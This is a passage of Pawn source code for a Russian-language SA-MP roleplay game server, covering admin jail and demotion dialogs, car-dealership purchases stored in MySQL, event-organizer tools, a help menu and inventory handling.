				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: RK", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 5 минут. Причина: RK", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 11:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 10*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: NonRP езда", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 10 минут. Причина: NonRP езда", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
			case 12:
			{
				PI[jailid][pJail] = 1;
				PI[jailid][pJailTime] = 5*60;
				SetPlayerInterior(jailid, 0);
				new idx = random(sizeof coord_spawn_demorgan);
				SetPlayerPos(jailid, coord_spawn_demorgan[idx][0], coord_spawn_demorgan[idx][1], coord_spawn_demorgan[idx][2]);
				SetPlayerFacingAngle(jailid, coord_spawn_demorgan[idx][3]);
				FreezePlayer(jailid, 2000);
				SetPlayerWantedLevel(jailid, 0);
				SetPlayerFacingAngle(jailid,0);
				SetCameraBehindPlayer(jailid);
				format(jail_string, sizeof(jail_string), "Администратор %s посадил в деморган игрока %s. Причина: NonRP", GetName(playerid), GetName(jailid));
				SendClientMessageToAll(COLOR_RED, jail_string);
				format(jail_string, sizeof jail_string, "[A] %s[%d] заключил в тюрьму %s[%d] на 5 минут. Причина: NonRP", GetName(playerid), playerid, GetName(jailid), jailid);
				SendAdminMessage(0xA2A2A2FF, jail_string);
				SendClientMessage(jailid, -1, "Время до выхода на свободу: {cccc00}/time");
			}
		}
		MysqlUpdatePlayerInt(jailid, "jail", PI[jailid][pJail]);
		MysqlUpdatePlayerInt(jailid, "jailtime", PI[jailid][pJailTime]);
		if(pCuff[jailid][pCuffer] != INVALID_PLAYER_ID)
		{
			new cuffer = pCuff[jailid][pCuffer];
			SetPlayerSpecialAction(jailid, SPECIAL_ACTION_NONE);
			RemovePlayerAttachedObject(jailid, 0);
			pCuff[jailid][pCuffer] = INVALID_PLAYER_ID;
			pCuff[jailid][pCuffee] = INVALID_PLAYER_ID;
			pCuff[cuffer][pCuffee] = INVALID_PLAYER_ID;
			pCuff[cuffer][pCuffer] = INVALID_PLAYER_ID;
		}
		SetPlayerVirtualWorld(jailid, 1);
		admin_attempt[playerid] ++ ;

		mysql_format(dbHandle, jail_string, sizeof jail_string, "UPDATE "T_ADMIN" SET `jails` = `jails` + 1 WHERE `name` = '%e'", GetName(playerid));
		mysql_tquery(dbHandle, jail_string, "", "");
		printf("%s", jail_string);

		if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
		if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
		{
		    new ban_str[128];
			format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
			SendClientMessageToAll(0xFE0000AA, ban_str);
			SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
		    admin_ban_time[playerid] = 600;
			MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
		    admin_attempt[playerid] = 0;
		    admin_check_time[playerid] = 0;
			SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
			return true;
		}
	}

		case D_REMOVEADMIN:
		{
		    if(!response) return false;

		    new r_format[32], a_str[32], p_text[90];

		    format(r_format, sizeof r_format, "admin_name_id_%d", listitem);
			GetPVarString(playerid, r_format, a_str, sizeof a_str);


			format(p_text, sizeof p_text, "{FFFFFF}Вы действительно хотите снять OFFLINE администратора %s?", a_str);

			SetPVarString(playerid, "ADMIN_NAME", a_str);

			ShowPlayerDialog(playerid, D_REMOVEADMIN1, DIALOG_STYLE_MSGBOX, "{FA4E5C}Снятие администратора", p_text, "Да", "Нет");

		}

		/*case D_SET_DEVELOPER:
		{
			if(!response) return false;

			SetPVarInt(playerid, "developer_list", listitem);

			ShowPlayerDialog(playerid, D_SET_DEVELOPER+1, DIALOG_STYLE_LIST, "Выберите действие:", "1. Изменить ник-нейм администратора\n2. Освободить место", "

		}*/

        case D_REMOVEADMIN1:
		{
		    if(!response) return false;

		    new a_name[24], string[128], delete_str[64];
		    GetPVarString(playerid, "ADMIN_NAME", a_name, sizeof a_name);

    		if(GetPlayerID(a_name) != INVALID_PLAYER_ID) PI[GetPlayerID(a_name)][pAdmin] = 0;
			mysql_format(dbHandle, string, sizeof(string), "DELETE FROM "T_ADMIN" WHERE `name`='%e'", a_name);
			mysql_tquery(dbHandle, string, "", "");
			mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ACCOUNTS" SET `admin` = '0' WHERE `name` = '%e'", a_name);
			mysql_tquery(dbHandle, string, "", "");
	    	format(string, sizeof(string), "[A] %s снял %s с должности администратора", GetName(playerid), a_name);
	    	SendAdminMessage(COLOR_GREY, string);

		    format(delete_str, sizeof delete_str, "Администратор %s был успешно снят с поста", a_name);
		    SendClientMessage(playerid, -1, delete_str);
		}

		case D_REMOVELEADER:
		{
		    if(!response) return false;

		    new r_format[32], a_str[32], p_text[90];

		    format(r_format, sizeof r_format, "leader_name_id_%d", listitem);
			GetPVarString(playerid, r_format, a_str, sizeof a_str);


			format(p_text, sizeof p_text, "{FFFFFF}Вы действительно хотите снять OFFLINE лидера %s?", a_str);

			SetPVarString(playerid, "LEADER_NAME", a_str);

			ShowPlayerDialog(playerid, D_REMOVELEADER1, DIALOG_STYLE_MSGBOX, "{FA4E5C}Снятие лидера", p_text, "Да", "Нет");

		}


        case D_REMOVELEADER1:
		{
		    if(!response) return false;

		    new a_name[24];
		    GetPVarString(playerid, "LEADER_NAME", a_name, sizeof a_name);

    		if(GetPlayerID(a_name) != INVALID_PLAYER_ID) PI[GetPlayerID(a_name)][pLeader] = 0;

    		STRING_GLOBAL[0] = EOS;
			mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET `leader` = '0', `rank` = '0', `member` = '0' WHERE `name` = '%e'", a_name);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

			STRING_GLOBAL[0] = EOS;
	    	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[A] %s снял %s с должности лидера", GetName(playerid), a_name);
	    	SendAdminMessage(COLOR_GREY, STRING_GLOBAL);

            STRING_GLOBAL[0] = EOS;
		    format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Лидер %s был успешно снят с поста", a_name);
		    SendClientMessage(playerid, -1, STRING_GLOBAL);
		}

		case 16000:
		{
			if(response)
			{
				if(0 <= listitem <= 3)
				{
					/*if(PI[playerid][P_SALON] == 0 && listitem == 3)
						return SendClientMessage(playerid, C_RED, "В 4 слот можно купить только грузовик");

					if(listitem != 3 && PI[playerid][P_SALON] == 1)
						return SendClientMessage(playerid, C_RED, "В 4 слот можно купить только грузовик");*/

					new rows;
					new Cache: result;
					new slot = -1;

					STRING_GLOBAL[0] = EOS;
					mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM ownable_cars WHERE owner_name='%e' AND slot=%d", GetName(playerid), listitem + 1);
					result = mysql_query(dbHandle, STRING_GLOBAL);

					rows = cache_num_rows();

					if(rows)
						return SendClientMessage(playerid, C_GREY, "Автомобить в этом слоте уже есть, продайте его для покупки нового"), cache_delete(result);
					else slot = listitem;

					cache_delete(result);

					if(listitem != 0)
					{
						STRING_GLOBAL[0] = EOS;
						mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM ownable_cars WHERE owner_name='%e' AND slot=%d", GetName(playerid), listitem);
						result = mysql_query(dbHandle, STRING_GLOBAL);

						rows = cache_num_rows();

						if(!rows)
							return SendClientMessage(playerid, C_GREY, "Для покупки автомобиля в этом слоте нужно купить автомобиль в предыдущий слот"), cache_delete(result);
					}

					if(slot == -1)
						return 1;

					/*if(listitem > 0 && PI[playerid][pVip] <= 0)
						return SendClientMessage(playerid,COLOR_ORANGE,"Покупать вторую машину доступно только VIP игрокам");

					if(1 < listitem < 3 && PI[playerid][pDonateCar] == 0)
						return SendClientMessage(playerid,COLOR_ORANGE,"У Вас нет привелегии покупки авто для #3 слота, приобрести: /donate");

					if(listitem > 2 && PI[playerid][P_SALON] != 1)
						return SendClientMessage(playerid, C_RED, "В 4 слот можно купить только грузовик");

					if(listitem > 2 && PI[playerid][pLevel] < 8)
						return SendClientMessage(playerid, C_RED, "Купить грузовик можно только с 8 уровня");*/

					new idx = pPressed[playerid],
						salon = PI[playerid][P_SALON];

					if(PI[playerid][pCash] < g_vehicle_info[car_market_data[salon][idx][0]-400][VI_COST])
						return SendMess(playerid, MSG_NOT_MONEY);

					GiveMoney(playerid, -g_vehicle_info[car_market_data[salon][idx][0]-400][VI_COST]);

					TogglePlayerControllable(playerid,true);
					BuyCloseCar(playerid);

					SendClientMessage(playerid, COLOR_ORANGE, "Поздравляем с приобретением автомобиля!");

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Автомобиль помещен в слот #%d, пожалуйста, не забудьте припарковать его (/park)", slot + 1);
					SendClientMessage(playerid, COLOR_ORANGE, STRING_GLOBAL);

                    new vehicleid = GetPlayerVehicleID(playerid);
                    g_vehicle[vehicleid][veh_wear] = 1000.0;

                    if(salon == 0)
                    {
						new r = random(sizeof SalonRandSpawn_1);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO ownable_cars (owner_name, model, color_1, color_2, slot, pos_x, pos_y, pos_z, pos_r) VALUES ('%s', '%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f')", GetName(playerid), car_market_data[salon][idx][0], PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], slot + 1, SalonRandSpawn_1[r][0], SalonRandSpawn_1[r][1], SalonRandSpawn_1[r][2], SalonRandSpawn_1[r][3]);
						mysql_query(dbHandle, STRING_GLOBAL);
					}
					if(salon == 1)
					{
						new r = random(sizeof SalonRandSpawn_2);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO ownable_cars (owner_name, model, color_1, color_2, slot, pos_x, pos_y, pos_z, pos_r) VALUES ('%s', '%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f')", GetName(playerid), car_market_data[salon][idx][0], PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], slot + 1, SalonRandSpawn_2[r][0], SalonRandSpawn_2[r][1], SalonRandSpawn_2[r][2], SalonRandSpawn_2[r][3]);
						mysql_query(dbHandle, STRING_GLOBAL);
					}
					if(salon == 2)
					{
						new r = random(sizeof SalonRandSpawn_3);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO ownable_cars (owner_name, model, color_1, color_2, slot, pos_x, pos_y, pos_z, pos_r) VALUES ('%s', '%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f')", GetName(playerid), car_market_data[salon][idx][0], PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], slot + 1, SalonRandSpawn_3[r][0], SalonRandSpawn_3[r][1], SalonRandSpawn_3[r][2], SalonRandSpawn_3[r][3]);
						mysql_query(dbHandle, STRING_GLOBAL);
					}

					new businessid = GetPVarInt(playerid, "PlayerBizz");

					if(BizzInfo[businessid][bProduct] > 0)
					{
						BizzInfo[businessid][bMoney] += (g_vehicle_info[car_market_data[salon][idx][0]-400][VI_COST] * 10) / 100;
						BizzInfo[businessid][bProduct] -= 100;
						BizzPay[businessid] += (g_vehicle_info[car_market_data[salon][idx][0]-400][VI_COST] * 10) / 100;
						MysqlUpdateBizzInt(businessid, "money", BizzInfo[businessid][bMoney]);
						MysqlUpdateBizzInt(businessid, "product", BizzInfo[businessid][bProduct]);
					}

					/*STRING_GLOBAL[0] = '\0';
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT id FROM ownable_cars WHERE owner_name = '%s' AND slot = %d", GetName(playerid), slot+1);
					new Cache:result1 = mysql_query(dbHandle, STRING_GLOBAL);

					if(result1)
					{
						LoadPlayerOwnableCar(playerid, cache_get_field_content_int(0, "id", dbHandle));
	 				}*/

					cache_delete(result);
				}
			}
		}
		case D_FIXCAR:
		{
			if(!response) return 1;

			new id = g_player_listitem[playerid][listitem],
				rows,
				Cache: result,
				slot;

			STRING_GLOBAL[0] = EOS;

			mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM `ownable_cars` WHERE `id` = '%d' LIMIT 1", id);
			result = mysql_query(dbHandle, STRING_GLOBAL);

			rows = cache_num_rows();

			if(rows)
			{
				slot = cache_get_field_content_int(0, "slot");

				if(PI[playerid][P_OWNABLE_CAR][slot - 1] == INVALID_VEHICLE_ID)
					LoadPlayerOwnableCar(playerid, id);

				else UnLoadPlayerOwnableCar(playerid, slot - 1);
			}

			cache_delete(result);
		}
        case 9993:
        {
            new Float:PlayerPos[3];
			GetPlayerPos(playerid, PlayerPos[0], PlayerPos[1], PlayerPos[2]);
  			foreach(new i: EventPlayers)
			{
				if(PlayerToPoint(50.0, i, PlayerPos[0], PlayerPos[1], PlayerPos[2]))
				{
  					if(response)
					{
		    		    TogglePlayerControllable(i, false);
						SendClientMessage(i, 0xFF6347AA, "Организатор заморозил всех.");
					 	TogglePlayerControllable(playerid, true);
					}
   					else
		       		{
         	 			TogglePlayerControllable(i, true);
						SendClientMessage(i, 0xFF6347AA, "Организатор снял заморозку.");
					 	TogglePlayerControllable(playerid, true);
            		}
				}
			}
			return 1;
		}
 		case 9994:
        {
            if(!response) return 1;
	        switch(listitem)
	        {
				case 0: callcmd::settp(playerid);
				case 1: ShowPlayerDialog(playerid, 9993, DIALOG_STYLE_MSGBOX, "Заморозить игроков", "{FFFFFF}Радиус заморозки - 50m.", "FREEZE", "UNFREEZE");
				case 2:
				{
					new Float:PlayerPos[3];
					GetPlayerPos(playerid, PlayerPos[0], PlayerPos[1], PlayerPos[2]);
				    foreach(new i: EventPlayers)
					{
					    if(PlayerToPoint(50.0, i, PlayerPos[0], PlayerPos[1], PlayerPos[2]))
						{
							PI[i][pHeal] = 100;
							PI[i][pHealthS] = 100;
							SetHealth(i, 100);
        					SendClientMessage(i, 0xFF6347AA, "Организатор установил всем: HP - 100");
						}
					}
					return 1;
				}
				case 3:
				{
				    new Float:PlayerPos[3];
					GetPlayerPos(playerid, PlayerPos[0], PlayerPos[1], PlayerPos[2]);
				    foreach(new i: EventPlayers)
					{
					    if(PlayerToPoint(50.0, i, PlayerPos[0], PlayerPos[1], PlayerPos[2]))
						{
						    SetPlayerArmour(i, 100);
        					SendClientMessage(i, 0xFF6347AA, "Организатор установил всем: Armour - 100");
						}
					}
					return 1;
				}
				case 4:
				{
					ShowPlayerDialog(playerid, 9995, DIALOG_STYLE_INPUT, "Выдача оружия участникам", "Введите ID оружия, который хотите выдать всем.", "Готово", "Закрыть");
				}
			}
			return 1;
		}
		case 9995:
		{
			if(!response)
				return 1;

			new gun;
			if(sscanf(inputtext, "d", gun))
				return ShowPlayerDialog(playerid, 9995, DIALOG_STYLE_INPUT, "Выдача оружия участникам", "Введите ID оружия, который хотите выдать всем.", "Готово", "Закрыть");
			else if(!(1 <= gun <= 46))
				return ShowPlayerDialog(playerid, 9995, DIALOG_STYLE_INPUT, "Выдача оружия участникам", "Введите ID оружия, который хотите выдать всем.", "Готово", "Закрыть");

			SetPVarInt(playerid, "MP_GUN", gun);
			ShowPlayerDialog(playerid, 9996, DIALOG_STYLE_INPUT, "Выдача оружия участникам", "Введите количество патронов, которое хотите выдать.", "Готово", "Закрыть");
			return 1;
		}
		case 9996:
		{
			if(!response)
				return 1;

			new ammo;
			if(sscanf(inputtext, "d", ammo))
				return ShowPlayerDialog(playerid, 9996, DIALOG_STYLE_INPUT, "Выдача оружия участникам", "Введите количество патронов, которое хотите выдать.", "Готово", "Закрыть");
			else if(!(1 <= ammo <= 9999))
				return ShowPlayerDialog(playerid, 9996, DIALOG_STYLE_INPUT, "Выдача оружия участникам", "Введите количество патронов, которое хотите выдать.", "Готово", "Закрыть");

			new Float:PlayerPos[3], gun = GetPVarInt(playerid, "MP_GUN");
			GetPlayerPos(playerid, PlayerPos[0], PlayerPos[1], PlayerPos[2]);
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Организатор выдал всем оружие под ID %d и %d патронов.", gun, ammo);

			foreach(new i: EventPlayers)
			{
				if(PlayerToPoint(50.0, i, PlayerPos[0], PlayerPos[1], PlayerPos[2]))
				{
					GivePlayerWeapon(i, gun, ammo);
					SendClientMessage(i, 0xFF6347AA, STRING_GLOBAL);
				}
			}
			return 1;
		}
		case 3792:
	    {
	        if(!response) return 1;
	        switch(listitem)
	        {
				case 0:{new target = GetPlayerTargetPlayer(playerid);callcmd::pass(target, "");}
				case 1:{new target = GetPlayerTargetPlayer(playerid);callcmd::lic(target, "");}
				case 2:{new target = GetPlayerTargetPlayer(playerid);callcmd::med(target, "");}
	        }
	    }
	    case 3793:
	    {
	        if(!response) return 1;
	        ShowPlayerDialog(playerid, 3794, DIALOG_STYLE_LIST, "Помощь по серверу", "1. Общение\n2. Список игроков\n3. Транспорт\n4. Общее\n5. Работа\n6. Оружие и убийство\n7. Получение документов\n8. Задания", "Далее", "Отмена");
	    	return 1;
	    }
	    case 3794:
	    {
	        if(!response) return 1;
	        switch(listitem)
	        {
	            case 0:
	            {
	                STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tОбщение\n\n");
	                strcat(STRING_GLOBAL, "Вы можете общаться с другими игроками через чат в левом верхнем углу.\n");
	                strcat(STRING_GLOBAL, "Чтобы напечатать сообщение, нажмите клавишу \"F6\" или \"T\" (на латинице).\n");
	                strcat(STRING_GLOBAL, "Так же с помощью чата используются все команды сервера, к примеру \"/menu\".\n\n");
	                strcat(STRING_GLOBAL, "Используйте \"/menu\" для просмотра персонального меню.\n");
	                strcat(STRING_GLOBAL, "В диалоговом окне Вы сможете найти всё необходимое.\n");
	                strcat(STRING_GLOBAL, "Более подробное описание Вы найдёте на нашем сайте "SERVER_WEBSITE"\n");
	                strcat(STRING_GLOBAL, "Так же регистрируйтесь на форуме, в дальнейшем Вам это пригодится "SERVER_FORUM"");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Общение", STRING_GLOBAL, "Назад", "Закрыть");
	            }
	            case 1:
	            {
	                STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tСписок игроков\n\n");
	                strcat(STRING_GLOBAL, "Данный список можно посмотреть, нажав клавишу \"TAB\".\n");
	                strcat(STRING_GLOBAL, "Там Вы увидите:\n\n");
	                strcat(STRING_GLOBAL, "\"ID\" игрока (используется в командах)\n");
	                strcat(STRING_GLOBAL, "\"Ник\" (Role Play имя игрока)\n");
	                strcat(STRING_GLOBAL, "\"Уровень\" графа Score (количество лет в стране)\n");
	                strcat(STRING_GLOBAL, "\"Пинг\" время отклика между Вами и сервером (в милисекундах)\n\n");
	                strcat(STRING_GLOBAL, "Для просмотра списка полностью, используйте прокрутку справа.\n");
	                strcat(STRING_GLOBAL, "Вы в этой табличке всегда отображаетесь первым, независимо от ID.");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Список игроков", STRING_GLOBAL, "Назад", "Закрыть");
	            }
	            case 2:
	            {
	                STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tТранспорт\n\n");
	                strcat(STRING_GLOBAL, "Я надеюсь Вы умеете управлять транспортным средством, но даже если нет,\n");
	                strcat(STRING_GLOBAL, "наша Автошкола и Авиашкола научат Вас.\n\n");
	                strcat(STRING_GLOBAL, "В Автошколу и Авиашколу придётся идти в любом случае, поскольку езда без прав не\n");
	                strcat(STRING_GLOBAL, "безопасна, а полёты уж темболее, ну и думаю Вы не хотите платить штрафы.\n");
	                strcat(STRING_GLOBAL, "Ну а пока можете воспользоваться велосипедом или общественным транспортом.\n");
	                strcat(STRING_GLOBAL, "Для того, чтобы сесть на пассажирское место, используйте клавишу \"G\".\n");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Транспорт", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 3:
				{
				    STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tОбщее\n\n");
	                strcat(STRING_GLOBAL, "На нашем сервере можно зарабатывать деньги, все работы Вы можете найти в GPS-навигаторе.\n");
	                strcat(STRING_GLOBAL, "На заработанные деньги возможно приобретать недвижимость, транспорт и прочие мелочи.\n\n");
	                strcat(STRING_GLOBAL, "Можно работать полицейским защищая гражданских или быть на противоположной стороне закона,\n");
	                strcat(STRING_GLOBAL, "ведя войну за контроль над кварталами или бизнесами. И это только малая часть доступного!");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Общее", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 4:
				{
				    STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tРабота\n\n");
	                strcat(STRING_GLOBAL, "Многие профессии доступны каждому, но есть ограничения по прожитию в стране (уровню).\n\n");
	                strcat(STRING_GLOBAL, "Есть 4 работы для новичков, то место где Вы получите свои первые деньги:\n");
	                strcat(STRING_GLOBAL, "Работа на лесопилке. Суть работы: пилить деревья и относить на склад.\n");
	                strcat(STRING_GLOBAL, "Работа на шахте. Суть работы: добывать уголь и относить на склад. \n");
	                strcat(STRING_GLOBAL, "Работа на оружейном заводе. Суть работы: собирать детали для оружия.\n");
	                strcat(STRING_GLOBAL, "Любую из работ можно найти в GPS-навигаторе (/gps).\n\n");
	                strcat(STRING_GLOBAL, "Остальные работы (с ограничениями по уровню):\n");
	                strcat(STRING_GLOBAL, "Работа водителя маршрутки. Суть работы: ездить по разным заданным маршрутам.\n");
	                strcat(STRING_GLOBAL, "Работа таксиста. Суть работы: развозить пассажиров по конкретным местам.\n");
	                strcat(STRING_GLOBAL, "Работа механика. Суть работы: ремонтировать транспортные средства.\n");
	                strcat(STRING_GLOBAL, "Работа дальнобойщика. Суть работы: перевозить дерево и уголь на оружейный завод.\n");
	                strcat(STRING_GLOBAL, "На каждую из работ можно устроиться в любой мэрии города.");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Работа", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 5:
				{
				    STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tОружие и убийство\n\n");
	                strcat(STRING_GLOBAL, "Для ношения оружия необходима лицензия, без неё Вы не сможете приобрести оружие\n");
	                strcat(STRING_GLOBAL, "в магазине. Но, оружие можно достать и другими способами.\n\n");
	                strcat(STRING_GLOBAL, "За убийство человека Вы будете объявлены в розыск, как опасный преступник,\n");
	                strcat(STRING_GLOBAL, "а при аресте Вы лишитесь свободы и сядете в тюрьму!\n");
	                strcat(STRING_GLOBAL, "Так же почитайте Правила на нашем форуме "SERVER_FORUM"");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Оружие и убийство", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 6:
				{
				    STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tПолучение документов\n\n");
	                strcat(STRING_GLOBAL, "Чтобы получить гражданство в нашей стране\n");
	                strcat(STRING_GLOBAL, "нужно направится в Мэрию города (/gps)\n\n");
	                strcat(STRING_GLOBAL, "Получение мед. карты, нужно направится в Центральную больницу города\n");
	                strcat(STRING_GLOBAL, "Получить лицензии можно в автошколе.\n");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Получение документов", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 7:
				{
				    STRING_GLOBAL[0] = EOS;
	                strcat(STRING_GLOBAL, "\tЗадания для выполнения\n\n");
	                strcat(STRING_GLOBAL, "Чтобы вам не было скучно у нас на сервере\n");
	                strcat(STRING_GLOBAL, "Вы можете повыполнять задания для игроков (/quest)\n\n");
	                strcat(STRING_GLOBAL, "и получать за это хорошие призы\n");
	                ShowPlayerDialog(playerid, 3795, DIALOG_STYLE_MSGBOX, "Получение документов", STRING_GLOBAL, "Назад", "Закрыть");
				}
	        }
	    }
		case 3795:
		{
		    if(!response) return 1;
			else ShowPlayerDialog(playerid, 3794, DIALOG_STYLE_LIST, "Помощь по серверу", "1. Общение\n2. Список игроков\n3. Транспорт\n4. Общее\n5. Работа\n6. Оружие и убийство\n7. Получение документов\n8. Задания", "Далее", "Отмена");
		}
		case D_INVENT:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
		        if(strval(inputtext) < 1 || strval(inputtext) > 60) return SendClientMessage(playerid, COLOR_GREY, "Число может быть не больше 60");
		        new slot=PlayerUseList[playerid][MAX_LIST];
		        switch(PlayerItem1[playerid][slot])
		        {
		            case 20..26:
		            {
		                new ok;
		                for(new s = 16; s > 0; s --)
		                {
		                    if(PlayerItem1[playerid][ok]==27){ok=s;break;}
		                }
                  		if(PlayerItem2[playerid][ok]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько патронов");
		                switch(PlayerItem1[playerid][slot])
		                {
		                    case 20:GivePlayerWeapon(playerid, 25, strval(inputtext));//GivePlayerWeapon(playerid,22,strval(inputtext));
		                    case 21:GivePlayerWeapon(playerid, 22, strval(inputtext));
		                    case 22:GivePlayerWeapon(playerid, 24, strval(inputtext));
		                    case 23:GivePlayerWeapon(playerid, 29, strval(inputtext));
		                    case 24:GivePlayerWeapon(playerid, 30, strval(inputtext));
		                    case 25:GivePlayerWeapon(playerid, 31, strval(inputtext));
		                    case 26:GivePlayerWeapon(playerid, 33, strval(inputtext));
               		 	}
		                if(PlayerItem2[playerid][ok] == 0)
              		  		{
              		  		PlayerItem1[playerid][ok]=0;
         		 		    }
		                PlayerItem2[playerid][ok]-=strval(inputtext);
		                SaveItem(playerid,ok);
		            }
		        }
		        UpDateInv(playerid);
		        printf("All good");
		    }
		}
		case D_INVENT+1:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
		        if(strval(inputtext) < 1 || strval(inputtext) > 1000000) return SendClientMessage(playerid, COLOR_GREY, "Число может быть не больше 1000000");
			    new id=PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
			    new s=PlayerUseList[playerid][MAX_LIST];
		        new kolv=0;

				if(PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]] == 27)
				{
					if(strval(inputtext) < 100)
						return SendClientMessage(playerid, C_RED, "Вы не можете выкинуть менее 100 пт.");
				}

		        if(PlayerItem2[playerid][s]<=strval(inputtext)){kolv=PlayerItem2[playerid][s];}
				else if(PlayerItem2[playerid][s]>=strval(inputtext)){kolv=strval(inputtext);}
		        PlayerDropItemId(playerid,id,kolv);
		        PlayerItem2[playerid][s]-=strval(inputtext);
		        SaveItem(playerid,s);
		        UpDateInv(playerid);
		        new string[70];
				format(string, sizeof(string), "%s выкинул в сторону '%s'", GetName(playerid),Item[id][iName]);
				ProxDetector(15, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		        SendClientMessage(playerid,COLOR_GREY,"Вы успешно выкинули предмет!");
		    }
		}
		case D_INVENT+2:
		{
			if(response)
			{
			    PlayerUseList[playerid][MAX_LIST]=PlayerUseList[playerid][listitem];
			    new str[45], string[128];
			    new id=PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
			    format(str,sizeof(str),"Предмет: %s",Item[PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]]][iName]);
			    if(IsPlayerInRangeOfPoint(playerid,3.0,197.5494,490.0202,11.9900))
			    {
			        format(string, sizeof(string),
					"{FFFFFF}Вы желаете продать в ломбард {0099FF}'%s'{FFFFFF} за {63BD4E}%dр", Item[id][iName], Item[id][iLom]);
                    ShowPlayerDialog(playerid, D_INVENT+14, DIALOG_STYLE_MSGBOX, "Ломбард", string, "Продать", "Отмена");
				}
				else ShowPlayerDialog(playerid,D_INVENT+3,DIALOG_STYLE_LIST,str, "Использовать\nПередать\nВыкинуть", "Выбрать", "Выйти");
			}
		}
		case D_INVENT+3:
		{
			if(response)
			{
			    switch(listitem)
			    {
			        case 0:{OnPlayerUseItem(playerid,PlayerUseList[playerid][MAX_LIST]);}
